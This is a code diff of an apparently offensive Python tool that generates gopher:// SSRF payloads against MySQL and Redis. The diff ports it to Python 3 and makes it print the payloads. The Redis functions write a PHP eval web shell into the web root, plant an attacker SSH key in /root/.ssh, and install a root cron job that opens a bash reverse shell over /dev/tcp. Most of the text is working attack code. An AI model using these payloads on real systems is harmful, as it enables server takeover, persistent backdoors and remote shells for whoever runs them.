@@ -1,4 +1,4 @@
-import urllib
+import urllib, urllib.parse
 
 
 class mysqlssrf:
@@ -53,7 +53,15 @@ class mysqlssrf:
             else:
                 return encode(auth)
 
-        return get_payload(query)
+        pl = get_payload(query)
+        print('- ' * 40)
+        print('Query:', query)
+        print('Server:', server)
+        print('user:', user)
+        print('PS:', '_后面的部分需再次Url编码')
+        print('- ' * 40)
+        print(pl)
+        return pl
 
 
 class redisssrf:
@@ -69,14 +77,14 @@ class redisssrf:
         return cmd
 
     @staticmethod
-    def wShell(self, ip="192.168.163.128", port="6379",
-               shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n",
-               filename="shell.php",
-               path="/var/www/html",
-               passwd="",
-               protocol="gopher://",
-               cmd=[]
-               ):
+    def webShell(ip="192.168.163.128", port="6379",
+                 shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n",
+                 filename="shell.php",
+                 path="/var/www/html",
+                 passwd="",
+                 protocol="gopher://",
+                 cmd=[]
+                 ):
         if len(cmd) < 1:
             cmd = ["flushall",
                    "set 1 {}".format(shell.replace(" ", "${IFS}")),
@@ -88,11 +96,20 @@ class redisssrf:
             cmd.insert(0, "AUTH {}".format(passwd))
         payload = protocol + ip + ":" + port + "/_"
         for x in cmd:
-            payload += urllib.quote(redisssrf.redis_format(x))
+            payload += urllib.parse.quote(redisssrf.redis_format(x))
+        print('- ' * 40)
+        print('ip:', ip)
+        print('port:', port)
+        print('shell:', shell)
+        print('cmd:', cmd)
+        print('PS:', '_后面的部分需再次Url编码')
+
+        print('- ' * 40)
+        print(payload)
         return payload
 
     @staticmethod
-    def wPubkey(self, ip="192.168.163.128", port="6379",
+    def wPubkey(ip="192.168.163.128", port="6379",
                 filename="authorized_keys",
                 ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n",
                 path='/root/.ssh/',
@@ -112,14 +129,14 @@ class redisssrf:
         return payload
 
     @staticmethod
-    def rShell(self, ip="192.168.163.128", port="6379",
-               reverse_ip="127.0.0.1",
-               reverse_port='9999',
-               path="/var/spool/cron",
-               protocol='gopher://',
-               filename="root",
-               cmd=[]
-               ):
+    def rejShell(self, ip="192.168.163.128", port="6379",
+                 reverse_ip="127.0.0.1",
+                 reverse_port='9999',
+                 path="/var/spool/cron",
+                 protocol='gopher://',
+                 filename="root",
+                 cmd=[]
+                 ):
         cron = "\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n" % (reverse_ip, reverse_port)
 
         if len(cmd) < 1:
@@ -131,5 +148,13 @@ class redisssrf:
                    ]
         payload = protocol + ip + ":" + port + "/_"
         for x in cmd:
-            payload += urllib.quote(redisssrf.redis_format(x))
+            payload += urllib.parse.quote(redisssrf.redis_format(x))
+        print('- ' * 40)
+        print('target:', ip + ':' + port)
+        print('source:', reverse_ip + ':' + reverse_port)
+        print('path:', path)
+        print('filename:', filename)
+        print('PS:', '_后面的部分需再次Url编码')
+        print('- ' * 40)
+        print(payload)
         return payload
